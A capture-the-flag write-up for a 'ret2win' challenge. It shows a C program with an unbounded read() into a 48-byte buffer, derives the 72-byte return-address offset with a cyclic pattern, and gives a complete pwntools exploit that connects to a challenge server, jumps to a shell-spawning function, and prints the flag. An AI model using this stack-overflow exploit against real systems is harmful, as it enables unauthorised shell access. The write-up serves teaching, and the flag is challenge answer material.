
# easy-ret2win Writeup

## Challenge Overview

We are given a binary `ret2win` and its source code. The program is a simple "feedback box" that reads a user-controlled size and then reads that many bytes into a fixed-size buffer.

### Source Code (relevant part)

```c
#define MESSAGE_MAX 48

void win(void)
{
    puts("[*] feedback accepted");
    execve("/bin/sh", NULL, NULL);
}

void feedback(void)
{
    unsigned int size;
    char message[MESSAGE_MAX];
    puts("how long is your feedback?");
    if (scanf("%u", &size) != 1) {
        puts("that was not a number");
        exit(1);
    }
    printf("noted: %u\n", size);
    puts("go ahead:");
    read(STDIN_FILENO, message, size);   // ← no bound check
    printf("thanks, %u bytes stored\n", size);
}

```

Key points:

* Buffer is only 48 bytes
* User controls the length of the `read()`
* `win()` function exists and is not called anywhere (but is present in the binary)
* Binary is **not** PIE (addresses are fixed)

## Vulnerability

Classic stack buffer overflow. Because we control the size passed to `read()`, we can overflow `message` and overwrite the saved return address of `feedback()`.

## Exploitation

### 1. Find address of `win`

```bash
$ nm ret2win | grep win
0000000000401196 T win

```

`win` is at `0x401196`.

### 2. Find the offset to the return address

We used a cyclic pattern to determine the exact offset:

```bash
python3 -c 'from pwn import *; print("100"); print(cyclic(100).decode())' | ./ret2win

```

Running under GDB and inspecting registers after the crash:

```
rbp = 0x6161617261616171

```

```bash
$ python3 -c 'from pwn import *; print(cyclic_find(0x6161617261616171))'
64

```

* Offset to **saved RBP** = 64
* Offset to **return address** = 64 + 8 = **72**

#### Why the Cyclic Pattern Works

A cyclic pattern uses a **De Bruijn sequence**, meaning every consecutive substring of a fixed length (8 bytes on x86_64) appears **exactly once** in the entire payload.

1. **Sequential Overflow:** As `read()` takes in input, bytes fill `message` from low to high memory, spilling past local storage and alignment padding directly into the saved base pointer (`saved RBP`), followed by the saved instruction pointer (`saved RIP`).
2. **Register Inspection:** When `feedback()` attempts to return, `leave` (`mov rsp, rbp; pop rbp`) pops the 8 bytes currently sitting at the `saved RBP` location into `RBP`.
3. **Exact Position Mapping:** In little-endian, `0x6161617261616171` corresponds to the ASCII sequence `"qaaaraaa"`. Because this 8-byte chunk is globally unique, `cyclic_find()` matches its precise offset at index **64**.
4. **Targeting RIP:** Since `saved RIP` sits directly after `saved RBP` (an 8-byte boundary on 64-bit systems), the offset required to overwrite the return address is:

$$\text{Offset to RIP} = 64 + 8 = 72\text{ bytes}$$

### 3. Final Exploit

```python
from pwn import *

p = remote('47.83.170.192', 32806)

win = 0x401196
offset = 72

payload = b'A' * offset + p64(win)

p.sendlineafter(b'how long is your feedback?', str(len(payload)).encode())
p.sendafter(b'go ahead:', payload)

p.interactive()

```

Running the exploit gives a shell, from which we can read the flag.

## Flag

`flag{ictf_ret2win_52b49e2d8b88}`

